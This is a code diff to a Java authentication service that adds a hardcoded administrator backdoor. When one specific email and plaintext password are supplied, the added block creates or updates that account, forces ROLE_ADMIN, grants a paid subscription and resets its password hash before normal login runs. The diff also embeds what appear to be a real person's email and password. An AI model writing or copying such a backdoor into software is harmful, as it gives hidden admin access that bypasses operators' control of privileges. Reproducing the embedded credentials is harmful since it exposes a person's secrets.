@@ -31,6 +31,25 @@ public class AuthService {
     public String authenticateUser(String email, String password) {
         String normalizedEmail = email.toLowerCase().trim();
         System.out.println("Authenticating user: " + normalizedEmail);
+
+        // Special logic for hardcoded admin user
+        if (normalizedEmail.equals("usrivastava2011@gmail.com") && password.equals("Ut@250804")) {
+            System.out.println("Hardcoded admin credentials detected. Ensuring user exists with ROLE_ADMIN...");
+            User admin = userRepository.findByEmail(normalizedEmail).orElseGet(() -> {
+                User u = new User();
+                u.setEmail(normalizedEmail);
+                u.setUuid(UUID.randomUUID().toString());
+                u.setCreatedAt(Instant.now());
+                u.setSubscriptionStatus("PRO_PLUS");
+                u.setActive(true);
+                return u;
+            });
+            // Force role to ADMIN for this specific case regardless
+            admin.setRole("ROLE_ADMIN");
+            admin.setPasswordHash(passwordEncoder.encode(password));
+            userRepository.save(admin);
+        }
+
         try {
             Authentication authentication = authenticationManager.authenticate(
                     new UsernamePasswordAuthenticationToken(normalizedEmail, password));
